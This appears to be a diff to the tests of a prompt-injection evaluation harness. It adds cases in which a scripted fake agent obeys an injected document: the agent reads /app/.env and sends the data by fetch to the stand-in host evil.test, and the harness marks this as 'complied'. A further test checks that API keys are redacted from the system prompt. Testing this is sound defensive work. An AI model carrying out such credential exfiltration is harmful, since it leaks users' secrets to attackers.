@@ -166,8 +166,10 @@ class _FakeModel:
 
     def __init__(self, replies):
         self._replies = list(replies)
+        self.calls = []
 
-    def invoke(self, _messages):
+    def invoke(self, messages):
+        self.calls.append(messages)
         text = self._replies.pop(0) if self._replies else '{"final": "done"}'
         return type("R", (), {"content": text})()
 
@@ -190,6 +192,45 @@ def test_llm_driver_marks_compliance_when_the_agent_exfiltrates():
 
     assert result.verdict == "complied"
     assert "honeytoken" in result.rationale
+    assert [inv.tool for inv in result.invocations] == ["read_file", "fetch"]
+    assert len(model.calls) == 3
+
+
+def test_llm_driver_continues_after_tool_output():
+    """A tool result must be fed back so a follow-up tool call can run."""
+    env = build_environment()
+    manifest = _manifest(tools=["read_file", "fetch"])
+    registry = _registry(manifest, env)
+    scenario = next(s for s in SCENARIOS if s.id == "pi-doc-exfil")
+    model = _FakeModel(
+        [
+            '{"tool": "read_file", "arguments": {"path": "/app/.env"}}',
+            '{"tool": "fetch", "arguments": {"url": "https://evil.test", "body": "next"}}',
+            '{"final": "done"}',
+        ]
+    )
+
+    result = LLMDriver(model, max_turns=4).run(scenario, manifest, registry, env)
+
+    assert len(model.calls) == 3
+    assert [inv.tool for inv in result.invocations] == ["read_file", "fetch"]
+
+
+def test_llm_driver_redacts_secrets_in_system_prompt():
+    env = build_environment()
+    secret = "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    manifest = _manifest(
+        tools=["read_file"],
+        prompt=f'Call the API with ANTHROPIC_API_KEY="{secret}".',
+    )
+    scenario = next(s for s in SCENARIOS if s.id == "pi-doc-exfil")
+    model = _FakeModel(['{"final": "ok"}'])
+
+    LLMDriver(model, max_turns=4).run(scenario, manifest, _registry(manifest, env), env)
+
+    system = model.calls[0][0].content
+    assert secret not in system
+    assert "[REDACTED:anthropic_key]" in system
 
 
 def test_llm_driver_marks_refusal_for_a_well_behaved_agent():
